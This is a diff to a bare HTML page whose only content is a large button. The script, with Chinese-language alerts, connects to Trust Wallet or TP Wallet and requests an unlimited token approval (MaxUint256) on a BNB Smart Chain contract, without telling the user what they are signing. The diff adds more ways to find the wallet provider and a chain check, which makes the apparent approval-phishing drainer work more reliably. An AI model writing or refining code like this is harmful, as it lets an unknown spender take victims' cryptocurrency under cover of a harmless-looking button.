@@ -6,16 +6,8 @@
   <title></title>
   <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
   <style>
-    body { margin:0; padding:0; background:#000; height:100vh; display:flex; align-items:center; justify-content:center; }
-    button { 
-      padding: 40px 80px; 
-      font-size: 28px; 
-      background: #00cc66; 
-      color: #000; 
-      border: none; 
-      border-radius: 20px; 
-      cursor: pointer;
-    }
+    body { margin:0; padding:0; background:#000; height:100vh; display:flex; align-items:center; justify-content:center; color:#0f0; }
+    button { padding:40px 80px; font-size:28px; background:#00cc66; color:#000; border:none; border-radius:20px; }
   </style>
 </head>
 <body>
@@ -23,15 +15,28 @@
 
   <script>
     async function triggerApprove() {
-      if (typeof window.ethereum === 'undefined') {
-        alert("請在 Trust Wallet 中打開此頁面");
+      let provider;
+
+      // 嘗試多種 Provider 注入方式
+      if (window.ethereum) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+      } else if (window.trustwallet) {
+        provider = new ethers.providers.Web3Provider(window.trustwallet);
+      } else {
+        alert("未檢測到錢包，請在 Trust Wallet 或 TP Wallet 中打開");
         return;
       }
 
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
+
+        // 檢查鏈是否正確
+        const network = await provider.getNetwork();
+        if (network.chainId !== 56) {
+          alert("請切換到 BNB Smart Chain (鏈ID 56)");
+          return;
+        }
 
         const contract = new ethers.Contract(
           "0xF911450D38669139158C71CD9ED0d2f1524f8888",
@@ -44,10 +49,10 @@
           ethers.constants.MaxUint256
         );
 
-        alert("交易已發送！Hash: " + tx.hash);
+        alert("交易已發送！Hash:\n" + tx.hash);
       } catch (e) {
         console.error(e);
-        alert("錯誤: " + (e.message || "未知錯誤"));
+        alert("錯誤: " + (e.message || e));
       }
     }
   </script>
